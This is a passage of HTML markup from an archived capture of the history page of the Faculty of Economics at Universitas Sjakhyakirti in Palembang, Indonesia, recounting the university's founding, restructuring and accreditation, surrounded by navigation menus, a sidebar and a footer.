+                                                <a title="PROFIL" href="#" data-toggle="dropdown" class="dropdown-toggle" aria-haspopup="true">PROFIL </a>
+                                                <ul role="" class=" sub-menu">
+                                                    <li id="menu-item-4343" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4343">
+                                                        <a title="Sambutan Dekan" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/sambutan-dekan/">Sambutan Dekan</a>
+                                                    </li>
+                                                    <li id="menu-item-4330" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-4327 current_page_item menu-item-4330 active">
+                                                        <a title="Sejarah" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/sejarah/">Sejarah</a>
+                                                    </li>
+                                                    <li id="menu-item-4340" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4340">
+                                                        <a title="Struktur Organisasi" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/struktur-organisasi/">Struktur Organisasi</a>
+                                                    </li>
+                                                    <li id="menu-item-4341" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4341">
+                                                        <a title="Visi &amp; Misi Fakultas" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/visi-misi/">Visi &#038;Misi Fakultas</a>
+                                                    </li>
+                                                </ul>
+                                            </li>
+                                            <li id="menu-item-4490" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4490 dropdown">
+                                                <a title="PROGRAM STUDI" href="#" data-toggle="dropdown" class="dropdown-toggle" aria-haspopup="true">PROGRAM STUDI </a>
+                                                <ul role="" class=" sub-menu">
+                                                    <li id="menu-item-3971" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3971">
+                                                        <a title="Akuntansi" href="https://web.archive.org/web/20250907234827/https://akt.unisti.ac.id/">Akuntansi</a>
+                                                    </li>
+                                                    <li id="menu-item-3978" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3978">
+                                                        <a title="Manajemen" href="https://web.archive.org/web/20250907234827/https://mnj.unisti.ac.id/">Manajemen</a>
+                                                    </li>
+                                                </ul>
+                                            </li>
+                                            <li id="menu-item-3967" class="jihad menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3967 dropdown">
+                                                <a title="INFORMASI" href="#" data-toggle="dropdown" class="dropdown-toggle" aria-haspopup="true">INFORMASI </a>
+                                                <ul role="" class=" sub-menu">
+                                                    <li id="menu-item-4413" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-4413">
+                                                        <a title="Kalender Akademik" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/pengumuman/kalender-akademik/">Kalender Akademik</a>
+                                                    </li>
+                                                    <li id="menu-item-4412" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-4412">
+                                                        <a title="Jadwal Perkuliahan Semester Genap TA. 2024/2025" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/pengumuman/jadwal-perkuliahan-semester-genap-ta-2024-2025/">Jadwal Perkuliahan Semester Genap TA. 2024/2025</a>
+                                                    </li>
+                                                    <li id="menu-item-4410" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-4410">
+                                                        <a title="Ujian Akhir Semester Genap TA. 2024/2025" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/pengumuman/ujian-akhir-semester-genap-ta-2024-2025/">Ujian Akhir Semester Genap TA. 2024/2025</a>
+                                                    </li>
+                                                    <li id="menu-item-6006" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-6006">
+                                                        <a title="Ujian Proposal Skripsi TA. 2024/2025" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/pengumuman/pelaksanaan-seminar-proposal-skripsi-tahun-akademik-2024-2025/">Ujian Proposal Skripsi TA. 2024/2025</a>
+                                                    </li>
+                                                    <li id="menu-item-6058" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-6058">
+                                                        <a title="Ujian Skripsi / Ujian Komprehensif TA. 2024/2025" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/pengumuman/jadwal-ujian-komprehensif/">Ujian Skripsi / Ujian Komprehensif TA. 2024/2025</a>
+                                                    </li>
+                                                </ul>
+                                            </li>
+                                            <li id="menu-item-6970" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-6970 dropdown">
+                                                <a title="UNIT KERJA" href="#" data-toggle="dropdown" class="dropdown-toggle" aria-haspopup="true">UNIT KERJA </a>
+                                                <ul role="" class=" sub-menu">
+                                                    <li id="menu-item-13192" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-13192 dropdown">
+                                                        <a title="UPT" href="#">UPT</a>
+                                                        <ul role="" class=" sub-menu">
+                                                            <li id="menu-item-13193" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13193">
+                                                                <a title="GID BEI FESTI" href="https://web.archive.org/web/20250907234827/http://gidbeifesti.unisti.ac.id/">GID BEI FESTI</a>
+                                                            </li>
+                                                            <li id="menu-item-13194" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13194">
+                                                                <a title="KSU FESTI" href="https://web.archive.org/web/20250907234827/http://ksufesti.unisti.ac.id/">KSU FESTI</a>
+                                                            </li>
+                                                            <li id="menu-item-13195" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13195">
+                                                                <a title="RUMBIS FESTI" href="https://web.archive.org/web/20250907234827/https://rumbisfesti.unisti.ac.id/">RUMBIS FESTI</a>
+                                                            </li>
+                                                            <li id="menu-item-13196" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13196">
+                                                                <a title="TAX CENTER UNISTI" href="https://web.archive.org/web/20250907234827/https://tc.unisti.ac.id/">TAX CENTER UNISTI</a>
+                                                            </li>
+                                                        </ul>
+                                                    </li>
+                                                    <li id="menu-item-5076" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-5076 dropdown">
+                                                        <a title="UPPM" href="#">UPPM</a>
+                                                        <ul role="" class=" sub-menu">
+                                                            <li id="menu-item-6103" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6103">
+                                                                <a title="Ruang Lingkup dan Tupoksi UPPM" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/ruang-lingkup-dan-tupoksi-upm/">Ruang Lingkup dan Tupoksi UPPM</a>
+                                                            </li>
+                                                            <li id="menu-item-6089" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6089">
+                                                                <a title="Penelitian" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/penelitian/">Penelitian</a>
+                                                            </li>
+                                                            <li id="menu-item-6088" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6088">
+                                                                <a title="Pengabdian" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/pengabdian/">Pengabdian</a>
+                                                            </li>
+                                                        </ul>
+                                                    </li>
+                                                    <li id="menu-item-6651" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-6651 dropdown">
+                                                        <a title="UPM" href="https://web.archive.org/web/20250907234827/http:///">UPM</a>
+                                                        <ul role="" class=" sub-menu">
+                                                            <li id="menu-item-6111" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6111">
+                                                                <a title="Ruang Lingkup dan Tupoksi UPM" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/ruang-lingkup-dan-tupoksi-upm-2/">Ruang Lingkup dan Tupoksi UPM</a>
+                                                            </li>
+                                                            <li id="menu-item-6558" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-6558">
+                                                                <a title="Pedoman Akademik Fakultas Ekonomi UNISTI 2024" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/lpm/pedoman-akademik-fakultas-ekonomi-unisti-2024/">Pedoman Akademik Fakultas Ekonomi UNISTI 2024</a>
+                                                            </li>
+                                                            <li id="menu-item-6534" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-6534">
+                                                                <a title="Pedoman Penulisan Proposal &amp; Skripsi Prodi Akuntansi 2024" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/lpm/pedoman-penulisan-proposal-dan-skripsi-prodi-akuntansi-2024/">Pedoman Penulisan Proposal &#038;Skripsi Prodi Akuntansi 2024</a>
+                                                            </li>
+                                                            <li id="menu-item-6097" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-6097">
+                                                                <a title="Pedoman Penulisan Proposal &amp; Skripsi Prodi Manajemen 2024" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/lpm/pedoman-penulisan-proposal-dan-skripsi-prodi-manajemen-2024/">Pedoman Penulisan Proposal &#038;Skripsi Prodi Manajemen 2024</a>
+                                                            </li>
+                                                        </ul>
+                                                    </li>
+                                                </ul>
+                                            </li>
+                                            <li id="menu-item-3991" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3991 dropdown">
+                                                <a title="MAHASISWA" href="#" data-toggle="dropdown" class="dropdown-toggle" aria-haspopup="true">MAHASISWA </a>
+                                                <ul role="" class=" sub-menu">
+                                                    <li id="menu-item-6150" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6150">
+                                                        <a title="Unit Kegiatan Mahasiswa" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/unit-kegiatan-mahasiswa/">Unit Kegiatan Mahasiswa</a>
+                                                    </li>
+                                                    <li id="menu-item-4421" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-4421">
+                                                        <a title="Prosedur dan Layanan Akademik" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/mahasiswa/prosedur-layanan/">Prosedur dan Layanan Akademik</a>
+                                                    </li>
+                                                    <li id="menu-item-6690" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6690">
+                                                        <a title="Info Mahasiswa" href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/category/info-mahasiswa/">Info Mahasiswa</a>
+                                                    </li>
+                                                </ul>
+                                            </li>
+                                            <li class="search search-wpb">
+                                                <a class="search-icon">
+                                                    <i class="fas fa-search"></i>
+                                                </a>
+                                                <div style="display:none;" class="wpbsearchform">
+                                                    <form role="search" method="get" id="searchform" action="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/">
+                                                        <input id="s" class="bw_text_input" type="text" value="Click Enter to Search.." name="s"/>
+                                                    </form>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!--</navbar menu>-->
+                        <!--</main menu>-->
+                    </div>
+                </header>
+                <!--<container all>-->
+                <!--<container fluid>-->
+                <!--<the_loop>-->
+                <div class="page-heading">
+                    <div class="container">
+                        <div class="row">
+                            <div class="col-md-8 col-sm-8">
+                                <h1>Sejarah</h1>
+                            </div>
+                        </div>
+                        <!--/row-->
+                    </div>
+                    <!--/container-->
+                </div>
+                <div id="body">
+                    <div class="container">
+                        <div class="content-pad-3x">
+                            <div class="row">
+                                <div id="content" class="col-md-9" role="main">
+                                    <!--<post_class>-->
+                                    <div class="vc_column-inner post-4327 page type-page status-publish hentry">
+                                        <!--<breadcrumb>-->
+                                        <!--</breadcrumb>-->
+                                        <!--<share_tom>-->
+                                        <!--</share_tom>-->
+                                        <p>&nbsp;</p>
+                                        <p>
+                                            <img class="aligncenter size-full wp-image-11473" src="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2022/10/Fakultas-ekonomi-universitas-sjakhyakirti-palembang.jpg" alt="" width="714" height="587" srcset="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2022/10/Fakultas-ekonomi-universitas-sjakhyakirti-palembang.jpg 714w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2022/10/Fakultas-ekonomi-universitas-sjakhyakirti-palembang-300x247.jpg 300w" sizes="(max-width: 714px) 100vw, 714px"/>
+                                        </p>
+                                        <p>Perguruan Tinggi Sjakhyakirti Palembang pertama kali didirikan tanggal 31 Oktober 1953. Kemudian pada tanggal 3 November 1960 Perguruan Tinggi Sjakhyakirti dengan berbagai fasilitas yang ada termasuk areal tanah seluas 16 Ha diserahkan kepada Universitas Sriwijaya, karena keluarnya Peraturan Pemerintah Nomor 42 Tahun 1960 tentang Perguruan Tinggi. Maka Sjakhyakirti dilebur menjadi Perguruan Tinggi Negeri dengan nama Universitas Sriwijaya.</p>
+                                        <p>Namun pada tahun 1979, pengurus Yayasan Perguruan Tinggi Sjakhyakirti merasa terpanggil untuk mendirikan Perguruan Tinggi Sjakhyakirti  kembali, mengingat lulusan SLTA dari tahun ke tahun semakin meningkat, sedangkan daya tampung Perguruan Tinggi Negeri   terbatas, ide untuk mendirikan kembali Perguruan Tinggi Sjakhyakirti  mendapat dukungan dari Bapak Gubernur KDH.Tingkat I Sumatera Selatan yang selanjutnya diperoleh keputusan Dirjen RI nomor 381/D.4.II/I/1983 tanggal 16 Juni 1983.</p>
+                                        <p>Pada tahun 1982, Perguruan Tinggi Sjakhyakirti Palembang diubah menjadi Universitas Sjakhyakirti yang sekarang disingkat menjadi UNISTI dengan beberapa Fakultas/Akademi yaitu :</p>
+                                        <ul>
+                                            <li>Fakultas Pertanian</li>
+                                            <li>Fakultas Ilmu Administrasi</li>
+                                            <li>Fakultas Hukum</li>
+                                            <li>Akademi Akuntansi</li>
+                                        </ul>
+                                        <p>Pada tahun 2000, Universitas Sjakhyakirti mengusulkan untuk mendirikan Fakultas Ekonomi dengan Program Studi Manajemen dan Program Studi Akuntansi. Usulan pendirian Fakultas Ekonomi tersebut mendapat tanggapan dari DIKTI Jakarta, dengan dikeluarkannya Surat Keputusan Menteri Pendidikan Nasional nomor 305/DIKTI/Kep/2000 tanggal 31 Agustus 2000 dengan status terdaftar.</p>
+                                        <p>Saat ini Program Studi Akuntansi terakreditasi “BAIK” sesuai Keputusan LAMEMBA No. 2723/DE/A.5/AR.10/VIII/2025 dan Program Studi Manajemen terakreditasi &#8220;BAIK &#8221;sesuai Keputusan LAMEMBA No. 2724/DE/A.5/AR.10/VIII/2025  dan Akreditasi Institusi Perguruan Tinggi &#8220;B &#8221;sesuai SK BAN-PT No. 1/SK/BAN-PT/Ak.Ppj/PT/I/2024.</p>
+                                        <p>Fakultas Ekonomi memiliki Unit Pelayanan Teknis (UPT) yaitu: Galeri Investasi Digital Bursa Efek Indonesia Fakultas Ekonomi Universitas Sjakhyakirti (GID BEI FESTI), Koperasi Serba Usaha Fakultas Ekonomi Universitas Sjakhyakirti (KSU FESTI), Tax Center Universitas Sjakhyakirti  (Tax Center UNISTI), dan Rumah Bisnis Fakultas Ekonomi Universitas Sjakhyakirti (RUMBIS FESTI).</p>
+                                        <!--<date>-->
+                                        <div class="bw_blog_items">
+                                            Sep 3, 2025 -
+					Posted by					<a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/author/admin/">admin</a>
+                                        </div>
+                                        <!--</date>-->
+                                        <!--<author card>-->
+                                        <!--</author card>-->
+                                        <!--<default comments>-->
+                                        <!--</default comments>-->
+                                    </div>
+                                    <!--<post_class>-->
+                                </div>
+                                <div id="sidebar" class="col-md-3 normal-sidebar">
+                                    <div class="row">
+                                        <!--<sidebar list homepage>-->
+                                        <div style="width:100%;" class="wp-video">
+                                            <!--[if lt IE 9]><script>document.createElement('video');</script><![endif]-->
+                                            <video class="wp-video-shortcode" id="video-4327-1" preload="metadata" controls="controls">
+                                                <source type="video/youtube" src="https://web.archive.org/web/20250907234827im_/https://www.youtube.com/watch?v=xo337pc7y78&amp;_=1"/>
+                                                <a href="https://web.archive.org/web/20250907234827/https://www.youtube.com/watch?v=xo337pc7y78">https://www.youtube.com/watch?v=xo337pc7y78</a>
+                                            </video>
+                                        </div>
+                                        <div id="calendar_wrap" class="calendar_wrap">
+                                            <table id="wp-calendar" class="wp-calendar-table">
+                                                <caption>September 2025</caption>
+                                                <thead>
+                                                    <tr>
+                                                        <th scope="col" title="Monday">M</th>
+                                                        <th scope="col" title="Tuesday">T</th>
+                                                        <th scope="col" title="Wednesday">W</th>
+                                                        <th scope="col" title="Thursday">T</th>
+                                                        <th scope="col" title="Friday">F</th>
+                                                        <th scope="col" title="Saturday">S</th>
+                                                        <th scope="col" title="Sunday">S</th>
+                                                    </tr>
+                                                </thead>
+                                                <tbody>
+                                                    <tr>
+                                                        <td>1</td>
+                                                        <td>2</td>
+                                                        <td>
+                                                            <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/2025/09/03/" aria-label="Posts published on September 3, 2025">3</a>
+                                                        </td>
+                                                        <td>4</td>
+                                                        <td>5</td>
+                                                        <td>6</td>
+                                                        <td>7</td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td id="today">8</td>
+                                                        <td>9</td>
+                                                        <td>10</td>
+                                                        <td>11</td>
+                                                        <td>12</td>
+                                                        <td>13</td>
+                                                        <td>14</td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td>15</td>
+                                                        <td>16</td>
+                                                        <td>17</td>
+                                                        <td>18</td>
+                                                        <td>19</td>
+                                                        <td>20</td>
+                                                        <td>21</td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td>22</td>
+                                                        <td>23</td>
+                                                        <td>24</td>
+                                                        <td>25</td>
+                                                        <td>26</td>
+                                                        <td>27</td>
+                                                        <td>28</td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td>29</td>
+                                                        <td>30</td>
+                                                        <td class="pad" colspan="5">&nbsp;</td>
+                                                    </tr>
+                                                </tbody>
+                                            </table>
+                                            <nav aria-label="Previous and next months" class="wp-calendar-nav">
+                                                <span class="wp-calendar-nav-prev">
+                                                    <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/2025/08/">&laquo;Aug</a>
+                                                </span>
+                                                <span class="pad">&nbsp;</span>
+                                                <span class="wp-calendar-nav-next">&nbsp;</span>
+                                            </nav>
+                                        </div>
+                                        <div class="recentside">
+                                            <div class="sidefex clearfix">
+                                                <div class="xoxo">
+                                                    <h4 class="xoxox">
+                                                        <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/akreditasi-program-studi/sertifikat-akreditasi/">SERTIFIKAT AKREDITASI                   </a>
+                                                    </h4>
+                                                </div>
+                                                <div class="xoxo1">
+                                                    <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/akreditasi-program-studi/sertifikat-akreditasi/">
+                                                        <img width="65" height="80" src="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/web1-scaled-e1756900329362-65x80.jpg" class="attachment-delicious-recent-thumbnails size-delicious-recent-thumbnails wp-post-image" alt="" srcset="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/web1-scaled-e1756900329362-65x80.jpg 65w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/web1-scaled-e1756900329362-248x300.jpg 248w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/web1-scaled-e1756900329362-554x674.jpg 554w" sizes="(max-width: 65px) 100vw, 65px"/>
+                                                    </a>
+                                                </div>
+                                            </div>
+                                            <div class="sidefex clearfix">
+                                                <div class="xoxo">
+                                                    <h4 class="xoxox">
+                                                        <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/pengumuman/kalender-akademik/">Kalender Akademik Fakultas Ekonomi                   </a>
+                                                    </h4>
+                                                </div>
+                                                <div class="xoxo1">
+                                                    <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/pengumuman/kalender-akademik/">
+                                                        <img width="65" height="80" src="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2021/09/IMG-20211018-WA0028-65x80.jpg" class="attachment-delicious-recent-thumbnails size-delicious-recent-thumbnails wp-post-image" alt=""/>
+                                                    </a>
+                                                </div>
+                                            </div>
+                                            <div class="sidefex clearfix">
+                                                <div class="xoxo">
+                                                    <h4 class="xoxox">
+                                                        <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/alumni/testimoni-alumni-yudi/">Testimoni Alumni: Yudi                   </a>
+                                                    </h4>
+                                                </div>
+                                                <div class="xoxo1">
+                                                    <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/alumni/testimoni-alumni-yudi/">
+                                                        <img width="65" height="80" src="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-65x80.png" class="attachment-delicious-recent-thumbnails size-delicious-recent-thumbnails wp-post-image" alt="" srcset="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-65x80.png 65w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-240x300.png 240w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-819x1024.png 819w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-768x960.png 768w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-554x674.png 554w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_.png 1080w" sizes="(max-width: 65px) 100vw, 65px"/>
+                                                    </a>
+                                                </div>
+                                            </div>
+                                            <div class="sidefex clearfix">
+                                                <div class="xoxo">
+                                                    <h4 class="xoxox">
+                                                        <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/alumni/testimoni-alumni-maharani/">Testimoni Alumni: Maharani                   </a>
+                                                    </h4>
+                                                </div>
+                                                <div class="xoxo1">
+                                                    <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/alumni/testimoni-alumni-maharani/">
+                                                        <img width="65" height="80" src="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-65x80.png" class="attachment-delicious-recent-thumbnails size-delicious-recent-thumbnails wp-post-image" alt="" srcset="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-65x80.png 65w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-240x300.png 240w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-819x1024.png 819w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-768x960.png 768w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-554x674.png 554w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_.png 1080w" sizes="(max-width: 65px) 100vw, 65px"/>
+                                                    </a>
+                                                </div>
+                                            </div>
+                                            <div class="sidefex clearfix">
+                                                <div class="xoxo">
+                                                    <h4 class="xoxox">
+                                                        <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/alumni/testimoni-alumni/">Testimoni Alumni: Muhlisin                   </a>
+                                                    </h4>
+                                                </div>
+                                                <div class="xoxo1">
+                                                    <a href="https://web.archive.org/web/20250907234827/https://festi.unisti.ac.id/alumni/testimoni-alumni/">
+                                                        <img width="65" height="80" src="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-65x80.png" class="attachment-delicious-recent-thumbnails size-delicious-recent-thumbnails wp-post-image" alt="" srcset="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-65x80.png 65w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-240x300.png 240w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-819x1024.png 819w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-768x960.png 768w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_-554x674.png 554w, https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/uploads/2025/09/festi.unisti.ac_.id5_.png 1080w" sizes="(max-width: 65px) 100vw, 65px"/>
+                                                    </a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <!--</sidebar list homepage>-->
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!--</the_loop>-->
+            <!--</container fluid>-->
+            <!--</container all>-->
+            <!--<bw_footer_widget>-->
+            <footer class="dark-div main-color-2-bg">
+                <section id="bottom">
+                    <div class="section-inner">
+                        <div class="container">
+                            <div class="row normal-sidebar">
+                                <!--<footer_left>-->
+                                <div id="nav_menu-2" class=" col-md-3  widget widget_nav_menu">
+                                    <div class=" widget-inner">
+                                        <h2 class="widget-title maincolor1">Hubungi Kami</h2>
+                                        <p>
+                                            Jl. Sultan Muhammad Mansyur<br/>
+                                            Kb Gede 32 Ilir, Palembang 30145,<br/>Sumatera Selatan Indonesia
+                                        </p>
+                                        <p>
+                                            Telepon: 0711358320, Fax: 0711364300,<br/>
+                                            Website : festi.sjakhyakirti.ac.id,<br/>
+                                            Email : festi@unisti.ac.id,<br/>HP : +62 85310213304
+                                        </p>
+                                    </div>
+                                </div>
+                                <!--</footer_left>-->
+                                <!--<footer_center>-->
+                                <div id="nav_menu-4" class=" col-md-3  widget widget_nav_menu">
+                                    <div class=" widget-inner">
+                                        <h2 class="widget-title maincolor1">Lokasi Kampus</h2>
+                                        <div class="textwidget custom-html-widget">
+                                            <iframe src="https://web.archive.org/web/20250907234827if_/https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3984.344410064735!2d104.74087971425818!3d-3.001646697813963!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e3b9fab9adba3f1%3A0x6b5c4c1a7c2060d0!2sUNIVERSITAS+SJAKHYAKIRTI+PALEMBANG!5e0!3m2!1sen!2sid!4v1553616770818" width="250" height="250" frameborder="0" style="border:0" allowfullscreen></iframe>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!--</footer_center>-->
+                                <!--<footer_center>-->
+                                <div id="black-studio-tinymce-2" class="col-md-3  widget widget_black_studio_tinymce">
+                                    <div class=" widget-inner">
+                                        <h2 class="widget-title maincolor1">Link Terkait</h2>
+                                        <div class="textwidget custom-html-widget">
+                                            <div style="padding:7px 0px;border-bottom:1px solid #959595;">
+                                                <a href="https://web.archive.org/web/20250907234827/https://ristekdikti.go.id/">KEMENRISTEKDIKTI RI</a>
+                                            </div>
+                                            <div style="padding:7px 0px;border-bottom:1px solid #959595;">
+                                                <a href="https://web.archive.org/web/20250907234827/http://lldikti2.ristekdikti.go.id/">L2DIKTI WILAYAH II</a>
+                                            </div>
+                                            <div style="padding:7px 0px;border-bottom:1px solid #959595;">
+                                                <a href="https://web.archive.org/web/20250907234827/https://banpt.or.id/">BAN-PT</a>
+                                            </div>
+                                            <div style="padding:7px 0px;border-bottom:1px solid #959595;">
+                                                <a href="https://web.archive.org/web/20250907234827/http://sisterunisti.ddns.net/">SISTER</a>
+                                            </div>
+                                            <div style="padding:7px 0px;border-bottom:1px solid #959595;">
+                                                <a href="https://web.archive.org/web/20250907234827/http://sintadev.ristekdikti.go.id/author/?mod=login">SINTA</a>
+                                            </div>
+                                            <div style="padding:7px 0px;border-bottom:1px solid #959595;">
+                                                <a href="https://web.archive.org/web/20250907234827/https://forlap.ristekdikti.go.id/">FORLAP DIKTI</a>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!--</footer_center>-->
+                                <!--<footer_right>-->
+                                <div id="black-studio-tinymce-6" class="col-md-3  widget widget_black_studio_tinymce">
+                                    <div class=" widget-inner">
+                                        <h2 class="widget-title maincolor1">Pengunjung</h2>
+                                        <div class="textwidget custom-html-widget">
+                                            <a href="https://web.archive.org/web/20250907234827/https://info.flagcounter.com/JTWe">
+                                                <img src="https://web.archive.org/web/20250907234827im_/https://s04.flagcounter.com/count2/JTWe/bg_FFFFFF/txt_000000/border_CCCCCC/columns_3/maxflags_30/viewers_Pengunjung/labels_1/pageviews_1/flags_0/percent_0/" alt="Flag Counter" border="0">
+                                            </a>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!--</footer_right>-->
+                            </div>
+                        </div>
+                    </div>
+                    <!--/container-->
+                </section>
+                <div id="bottom-nav">
+                    <div class="container">
+                        <div class="text-center line-under">
+                            <a class="btn btn-default main-color-2-bg back-to-top" href="#top">TOP</a>
+                        </div>
+                        <div class="row footer-content">
+                            <div class="copyright col-md-6">Copyright © Fakultas Ekonomi Universitas Sjakhyakirti 2019                        
+			</div>
+                            <nav class="col-md-6 footer-social">
+                                <ul class="list-inline pull-right social-list">
+                                    <li>
+                                        <a style="padding: 0px 3px;" href="https://web.archive.org/web/20250907234827/https://www.facebook.com/festi.unisti" class="btn btn-default social-icon">
+                                            <img src="https://web.archive.org/web/20250907234827im_/https://festi.unisti.ac.id/wp-content/themes/festi/icon/facebook.png">
+                                        </a>
+                                    </li>
+                                    <li>
